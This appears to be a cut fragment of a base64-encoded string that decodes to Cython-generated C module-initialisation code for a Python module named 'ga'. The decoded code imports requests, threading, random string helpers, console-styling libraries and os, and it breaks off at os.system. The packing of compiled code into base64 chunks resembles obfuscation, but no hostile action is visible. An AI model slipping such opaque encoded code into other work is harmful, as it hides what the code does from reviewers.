Uoc3BlYywgbW9kZGljdCwgInBhcmVudCIsICJfX3BhY2thZ2VfXyIsIDEpIDwgMCkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgInN1Ym1vZHVsZV9zZWFyY2hfbG9jYXRpb25zIiwgIl9fcGF0aF9fIiwgMCkgPCAwKSkgZ290byBiYWQ7CiAgICByZXR1cm4gbW9kdWxlOwpiYWQ6CiAgICBQeV9YREVDUkVGKG1vZHVsZSk7CiAgICByZXR1cm4gTlVMTDsKfQoKCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19weXhfcHltb2RfZXhlY19nYShQeU9iamVjdCAqX19weXhfcHlpbml0X21vZHVsZSkKI2VuZGlmCnsKICBpbnQgc3RyaW5ndGFiX2luaXRpYWxpemVkID0gMDsKICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICBpbnQgcHlzdGF0ZV9hZGRtb2R1bGVfcnVuID0gMDsKICAjZW5kaWYKICBfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzY7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5V""TEw7CiAgaW50IF9fcHl4X3RfMTA7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTFbM107CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICBpZiAoX19weXhfbSkgewogICAgaWYgKF9fcHl4X20gPT0gX19weXhfcHlpbml0X21vZHVsZSkgcmV0dXJuIDA7CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCAiTW9kdWxlICdnYScgaGFzIGFscmVhZHkgYmVlbiBpbXBvcnRlZC4gUmUtaW5pdGlhbGlzYXRpb24gaXMgbm90IHN1cHBvcnRlZC4iKTsKICAgIHJldHVybiAtMTsKICB9CiAgI2Vsc2UKICBpZiAoX19weXhfbSkgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tKTsKICAjZW5kaWYKICAKICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgX19weXhfdF8xID0gX19weXhfcHlpbml0X21vZHVsZTsKICBQeV9JTkNSRUYoX19weXhfdF8xKTsKICAjZWxzZQogIF9fcHl4X3RfMSA9IFB5TW9kdWxlX0NyZWF0ZSgmX19weXhfbW9kdWxlZGVmKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgewogICAgaW50IGFkZF9tb2R1bGVfcmVzdWx0ID0gX19QeXhfU3RhdGVfQWRkTW9kdWxlKF9fcHl4X3RfMSwgJl9fcHl4X21vZHVsZWRlZik7CiAgICBfX3B5eF90XzEgPSAwOyAKICAgIGlmICh1bmxpa2VseSgoYWRkX21vZHVsZV9yZXN1bHQgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAgIHB5c3RhdGVfYWRkbW9kdWxlX3J1biA9IDE7CiAgfQogICNlbHNlCiAgX19weXhfbSA9IF9fcHl4X3RfMTsKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICBQeVVuc3RhYmxlX01vZHVsZV9TZXRHSUwoX19weXhfbSwgUHlfTU9EX0dJTF9VU0VEKTsKICAjZW5kaWYKICBfX3B5eF9tc3RhdGUgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsOwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X3RfMSk7CiAgX19weXhfbXN0YXRlLT5fX3B5eF9kID0gUHlNb2R1bGVfR2V0RGljdChfX3B5eF9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2QpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgUHlfSU5DUkVGKF9fcHl4X21zdGF0ZS0+X19weXhfZCk7CiAgX19weXhfbXN0YXRlLT5fX3B5eF9iID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKF9fUHl4X0JVSUxUSU5fTU9EVUxFX05BTUUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfYikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50""aW1lID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKCJjeXRob25fcnVudGltZSIpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKFB5T2JqZWN0X1NldEF0dHJTdHJpbmcoX19weXhfbSwgIl9fYnVpbHRpbnNfXyIsIF9fcHl4X21zdGF0ZS0+X19weXhfYikgPCAwKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgCiAgI2lmIENZVEhPTl9SRUZOQU5OWQpfX1B5eF9SZWZOYW5ueSA9IF9fUHl4X1JlZk5hbm55SW1wb3J0QVBJKCJyZWZuYW5ueSIpOwppZiAoIV9fUHl4X1JlZk5hbm55KSB7CiAgUHlFcnJfQ2xlYXIoKTsKICBfX1B5eF9SZWZOYW5ueSA9IF9fUHl4X1JlZk5hbm55SW1wb3J0QVBJKCJDeXRob24uUnVudGltZS5yZWZuYW5ueSIpOwogIGlmICghX19QeXhfUmVmTmFubnkpCiAgICAgIFB5X0ZhdGFsRXJyb3IoImZhaWxlZCB0byBpbXBvcnQgJ3JlZm5hbm55JyBtb2R1bGUiKTsKfQojZW5kaWYKCl9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJQeUluaXRfZ2EiLCAwKTsKICBpZiAoX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24oX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCwgX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbigpLCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjaWZkZWYgX19QeHlfUHlGcmFtZV9Jbml0aWFsaXplX09mZnNldHMKICBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpOwogICNlbmRpZgogIF9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUgPSBQeVR1cGxlX05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKCIiLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZSgiIiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIAogIGlmIChfX1B5eF9Jbml0Q29uc3RhbnRzKF9fcHl4X21zdGF0ZSkgPCAwKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgc3RyaW5ndGFiX2luaXRpYWxpemVkID0gMTsKICBpZiAoX19QeXhfSW5pdEdsb2JhbHMoKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjaWYgMCB8fCBkZWZpbmVkKF9fUHl4X0N5RnVuY3Rpb25fVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9GdXNlZEZ1""bmN0aW9uX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfQ29yb3V0aW5lX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfR2VuZXJhdG9yX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfQXN5bmNHZW5fVVNFRCkKICBpZiAoX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfaW5pdChfX3B5eF9tKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VECiAgaWYgKF9fcHl4X0N5RnVuY3Rpb25faW5pdChfX3B5eF9tKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VECiAgaWYgKF9fcHl4X0Z1c2VkRnVuY3Rpb25faW5pdChfX3B5eF9tKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKICBpZiAoX19weXhfQ29yb3V0aW5lX2luaXQoX19weXhfbSkgPCAwKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgaWYgKF9fcHl4X0dlbmVyYXRvcl9pbml0KF9fcHl4X20pIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgaWYgKF9fcHl4X0FzeW5jR2VuX2luaXQoX19weXhfbSkgPCAwKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgCiAgaWYgKF9fcHl4X21vZHVsZV9pc19tYWluX2dhKSB7CiAgICBpZiAoUHlPYmplY3RfU2V0QXR0cihfX3B5eF9tLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21haW4pIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIH0KICB7CiAgICBQeU9iamVjdCAqbW9kdWxlcyA9IFB5SW1wb3J0X0dldE1vZHVsZURpY3QoKTsgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKCFQeURpY3RfR2V0SXRlbVN0cmluZyhtb2R1bGVzLCAiZ2EiKSkgewogICAgICBpZiAodW5saWtlbHkoKFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJnYSIsIF9fcHl4X20pIDwgMCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgICB9CiAgfQogIAogIGlmIChfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRlKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAKICBpZiAoX19QeXhfSW5pdENhY2hlZENvbnN0YW50cyhfX3B5eF9tc3RhdGUpIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGUpIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIAogICh2b2lkKV9fUHl4X21v""ZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGUpOwogICh2b2lkKV9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRlKTsKICAodm9pZClfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7CiAgaWYgKHVubGlrZWx5KChfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZSkgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAodm9pZClfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRlKTsKICAodm9pZClfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7CiAgKHZvaWQpX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGUpOwogIAoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIsIF9fcHl4X3RfMikgPCAwKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSwgX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCAzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMsIF9fcHl4X3RfMikgPCAwKSBfX1BZWF9FUlIoMCwgNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9""IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaW5nLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdHJpbmcsIF9fcHl4X3RfMikgPCAwKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWRQb29sRXhlY3V0b3IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbmN1cnJlbnRfZnV0dXJlcywgX19weXhfdF8yLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWRQb29sRXhlY3V0b3IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RocmVhZFBvb2xFeGVjdXRvciwgX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aHJlYWRpbmcsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZywgX19weXhfdF8zKSA8IDApIF9fUFlYX0VSUigwLCA3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8z""ID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2ZvbnRzLCBfX3B5eF90XzMsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVuZGVyLCBfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU3R5bGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbG9yYW1hLCBfX3B5eF90XzIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1N0eWxlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcywgX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCA5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX1B5eF9ERUNSRUYoX19w""eXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0ZvcmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb2xvcmFtYSwgX19weXhfdF8zLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRm9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZmZiwgX19weXhfdF8zKSA8IDApIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaG9pY2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDExLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDExLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjLCBfX3B5eF90XzIpIDwgMCkgX19QWVhfRVJSKDAsIDExLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0g""MDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zLCBfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDEyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wxX